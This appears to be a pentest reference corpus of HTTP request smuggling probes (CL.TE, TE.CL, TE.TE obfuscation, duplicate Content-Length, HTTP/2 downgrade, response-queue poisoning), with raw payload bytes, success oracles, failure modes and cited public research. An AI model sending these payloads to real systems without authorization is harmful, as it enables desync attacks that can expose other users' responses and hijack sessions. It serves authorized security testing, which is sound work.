house_rules: Probe bytes below are transcribed from the public record and attributed per entry - this corpus never invents bytes.
Line breaks inside probe bodies are CRLF. If you alter a single byte, recompute the chunk sizes and Content-Length values yourself.
Timing is a LEAD, never a CONFIRMED (organ rule 4): every timeout oracle must graduate to a response-class differential.
failure_modes are mandatory reading BEFORE closing a hypothesis as negative: a probe that failed for a listed reason leaves the seam untested, not disproven.

prerequisites: front-end honors Content-Length, back-end honors Transfer-Encoding: chunked
connection reuse between the two parsers
entries.probe:
POST /search HTTP/1.1
Host: {{host}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
entries.oracle: the smuggled 'GET /404' becomes the response to the NEXT request on the connection: the following normal request returns 404 (or the front-end's error for the malformed prefix) instead of its real body
failure_modes: the front-end normalizes or strips TE when both headers present - both parsers then agree (probe harmless, seam absent)
per-request connections (no keep-alive reuse between the disagreeing pair) - nothing is smuggled
response queue isolation / routing: the poisoned victim lands on a different back-end pool than your follow-up
a cache layer between you and the seam serves the follow-up from cache - the differential never reaches you
WAF drops CL+TE combinations outright - refusal, not a negative

source.title: HTTP request smuggling - Finding and confirming CL.TE vulnerabilities

entries.probe:
POST / HTTP/1.1
Host: {{host}}
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
entries.oracle: front-end forwards only the first 4 body bytes ('1\r\nA'); the back-end chunked parser waits for the rest of the chunk and stalls the connection - request hangs until timeout
failure_modes: front-end idle/read timeout shorter than your measurement window resets before you notice
any intermediary fully buffers and re-frames the request - no stall reaches the back-end
timeout alone NEVER confirms (organ rule 4) - graduate to DS-001 or park as LEAD

prerequisites: front-end honors Transfer-Encoding: chunked, back-end honors Content-Length
connection reuse between the two parsers
entries.probe:
POST /search HTTP/1.1
Host: {{host}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: {{host}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 144
x=
0
entries.oracle: the front-end ends the request at the '0' chunk; the back-end, honoring the smuggled request's own Content-Length: 144, absorbs the next real request as body - the victim's response IS the smuggled GET /404 response
failure_modes: the smuggled CL: 144 must span at least one full victim request - short victims (GET with no body) may not be fully absorbed; tune per victim
front-end rewrites headers on forwarding (adds X-Forwarded-For etc.) - byte counts shift, recompute
the back-end rejects the prefixed victim as malformed and closes - differential is a reset, ambiguous without the response-class pair

source.title: HTTP request smuggling - confirming TE.CL vulnerabilities

entries.probe:
POST / HTTP/1.1
Host: {{host}}
Transfer-Encoding: chunked
Content-Length: 6

0
X
entries.oracle: front-end (TE) ends the request at the zero chunk; back-end (CL: 6) has only 4 body bytes and blocks waiting for the remaining 2 - connection hangs
failure_modes: same buffering/timeout caveats as DS-002
the back-end instead treats the prefix as a new request and answers 400 - that is a response-class signal, not a failure: record it and move to DS-003

prerequisites: both parsers claim to honor Transfer-Encoding
at least one lenient TE parser in the chain
entries.probe:
Transfer-Encoding: xchunked
-- or --
Transfer-Encoding:
 chunked
-- or --
Transfer-Encoding: chunked
Transfer-Encoding: x
-- or --
Transfer-Encoding:[tab]chunked
entries.oracle: one parser treats the obfuscated header as absent (falls back to Content-Length), the other still parses chunked - converts a TE.TE agreement into a CL.TE or TE.CL seam; confirm with DS-001/DS-003 afterward
failure_modes: strict parsers reject the whole request (400/refusal) - refusal is not a negative
both parsers agree the obfuscation is invalid in the SAME direction - no seam, but re-test the other variants before closing
WAF/normalizing proxy rewrites the header before either parser sees it

source.title: HTTP Desync Attacks: Request Smuggling in the HTTP/1.1 Era (TE.TE obfuscation appendix)

prerequisites: a parser in the chain that accepts two Content-Length headers
entries.probe:
POST / HTTP/1.1
Host: {{host}}
Content-Length: 5
Content-Length: 6

A=1&B=
entries.oracle: two parsers pick different CL values (or different rejection postures) - the byte after the smaller CL becomes the next request's prefix; detect via the DS-001 response-class pattern
failure_modes: RFC-strict stacks reject duplicate CL outright (refusal, not a negative)
both parsers take the first (or last) value identically - record agreement as a FACT and move on

prerequisites: a browser-reachable page on the origin whose responses leave the socket in a state where a POST body is not drained
operator-owned browser session for the victim side
entries.oracle: the server processes the request as CL:0 (no body) but leaves the trailing bytes in the socket buffer; the browser's next request on that connection is prefixed by the smuggled request - the RESPONSE you receive corresponds to the smuggled request, not the browser's
failure_modes: the server drains the declared body or closes per-request sockets - no residual bytes
browser connection coalesling/priming heuristics route the follow-up elsewhere
any intermediary re-frames - classic caveat, applies to every entry here

prerequisites: HTTP/2 front-end that downgrades to HTTP/1.1 toward the back-end
ability to send arbitrary HTTP/2 headers (including content-length and transfer-encoding as regular headers)
entries.probe:
:method POST
:path /
content-length: 6

<DATA frames carrying more than 6 bytes ending in a complete smuggled request>
entries.oracle: the downgrade translates the declared content-length into HTTP/1.1 CL while extra DATA-frame bytes become the next request's prefix - confirm via the response-class differential on a subsequent request
failure_modes: the front-end enforces its own framing strictly and rejects mismatched content-length (refusal)
back-end is HTTP/2 native (no downgrade hop) - the seam does not exist on this chain
h2c-only internals never downgrade - map the chain first (organ procedure step 1)

source.title: HTTP/2: The Sequel Is Always Worse (H2.CL / H2.TE)

prerequisites: smuggled request that deliberately receives no response of its own
entries.probe: <smuggled request that elicits no response, e.g. an incomplete GET with no terminating blank line>
entries.oracle: the back-end's response queue desynchronizes by one: every subsequent user's response is shifted - the victim (operator-owned session) receives the previous user's response; bounded proof = ONE shifted response to an operator-owned victim, then stop
failure_modes: response routing is per-connection, not a shared queue - no shift observable
queue shift requires the smuggled request to genuinely hang server-side - test on operator accounts only (organ rule 1)
impact beyond the operator account is a report line, never an action
